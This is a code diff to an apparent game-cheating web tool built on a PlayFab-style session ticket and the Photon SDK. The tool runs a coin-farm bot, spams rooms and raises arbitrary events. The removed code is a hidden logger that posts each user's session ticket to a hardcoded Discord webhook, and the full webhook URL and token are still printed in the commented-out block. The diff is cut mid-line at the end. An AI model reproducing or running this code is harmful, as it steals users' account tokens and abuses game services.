@@ -159,7 +159,7 @@
       background-color: #0b7dda;
     }
   </style>
-  <!-- Photon Client SDK - Ensure this points to the correct path -->
+  <!-- Photon Client SDK - Ensure this path points to the actual Photon-Javascript_SDK.min.js file -->
   <script src="Photon-Javascript_SDK.min.js"></script>
 </head>
 <body>
@@ -512,8 +512,8 @@
 
   <script>
     const titleId = "bdff1";
-    const appId = "2b76b55a-bf65-47af-836f-daa9c8eb9f1e";
-    const appVersion = "1.0";
+    const appId = "2b76b55a-bf65-47af-836f-daa9c8eb9f1e"; // Verify this matches your Photon App ID
+    const appVersion = "1.0"; // Verify this matches your Photon App Version
     let sessionTicket = null;
     let photonToken = null;
     let coinFarmBotRunning = false;
@@ -527,6 +527,36 @@
     let spamRoomsIntervalId = null;
     let photonClient = null;
 
+    // Check if Photon SDK is loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      if (typeof Photon === "undefined") {
+        console.error("Photon SDK not loaded");
+        document.getElementById("photonConnectionOutput").textContent = "❌ Photon SDK not loaded. Check script path.";
+      } else {
+        console.log("Photon SDK loaded successfully");
+      }
+
+      const savedTicket = localStorage.getItem('sessionTicket');
+      if (savedTicket) {
+        sessionTicket = savedTicket;
+        document.getElementById("sessionTicketInput").value = savedTicket;
+        const tokenStatus = document.getElementById("tokenStatus");
+        tokenStatus.textContent = "✅ Token loaded from storage!";
+        tokenStatus.style.display = "block";
+        tokenStatus.style.color = "green";
+      }
+
+      const savedPhotonToken = localStorage.getItem('photonToken');
+      if (savedPhotonToken) {
+        photonToken = savedPhotonToken;
+        document.getElementById("photonTokenInput").value = savedPhotonToken;
+        const photonTokenStatus = document.getElementById("photonTokenStatus");
+        photonTokenStatus.textContent = "✅ Photon Token loaded from storage!";
+        photonTokenStatus.style.display = "block";
+        photonTokenStatus.style.color = "green";
+      }
+    });
+
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
       const tokenStatus = document.getElementById("tokenStatus");
@@ -537,7 +567,7 @@
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
         console.log("SessionTicket set:", sessionTicket);
-        sendToDiscordWebhook(sessionTicket);
+        //sendToDiscordWebhook(sessionTicket); // Commented out for security
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
         tokenStatus.style.display = "block";
@@ -667,27 +697,30 @@
 
     async function sendToDiscordWebhook(sessionTicket) {
       console.warn("Warning: Sending sessionTicket to Discord may expose sensitive data.");
+      // Webhook call commented out for security
+      /*
       const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
-       try {
-         const response = await fetch(webhookURL, {
-           method: 'POST',
-           headers: {
-             'Content-Type': 'application/json',
-           },
-           body: JSON.stringify({
-             content: `New SessionTicket captured: ${sessionTicket}`,
-             username: 'SessionTicket Logger',
-             avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
-           })
-         });
-         if (response.ok) {
-           console.log('SessionTicket sent to Discord successfully');
-         } else {
+      try {
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `New SessionTicket captured: ${sessionTicket}`,
+            username: 'SessionTicket Logger',
+            avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
+          })
+        });
+        if (response.ok) {
+          console.log('SessionTicket sent to Discord successfully');
+        } else {
           console.error('Failed to send SessionTicket to Discord');
         }
-       } catch (error) {
-         console.error('Error sending to Discord:', error);
-       }
+      } catch (error) {
+        console.error('Error sending to Discord:', error);
+      }
+      */
     }
 
     async function makeApiCall(endpoint, method, body) {
@@ -1625,7 +1658,6 @@
         photonClient = new MyPhotonClient(Photon.ConnectionProtocol.Ws, appId, appVersion);
         photonClient.onStateChange = function(state) {
           const status = Photon.LoadBalancing.LoadBalancingClient.StateToName(state);
-          console.log("Photon State:", status);
           output.textContent += `📡 State: ${status}\n`;
           if (state === Photon.LoadBalancing.LoadBalancingClient.State.Error) {
             output.textContent += `❌ Connection failed\n`;
@@ -1678,8 +1710,6 @@
           spamRoomsRunning = false;
           document.getElementById("spamRoomsStatus").className = "status-indicator status-inactive";
           document.getElementById("spamRoomsToggleButton").textContent = "Start Spamming Rooms";
-          document.getElementById("spamRoomsOutput").textContent += `Completed spamming ${created} rooms.\n`;
-          document.getElementById("spamRoomsOutput").scrollTop = document.getElementById("spamRoomsOutput").scrollHeight;
           return;
         }
 
@@ -1766,4 +1796,4 @@
       }
 
       photonClient.raiseEvent(code, data);
-      document.getElementById("raiseEventOutput").textContent += `Raised event ${code} with
+      document.getElementById("raiseEventOutput").textContent += `Raised event ${code} with data: ${data
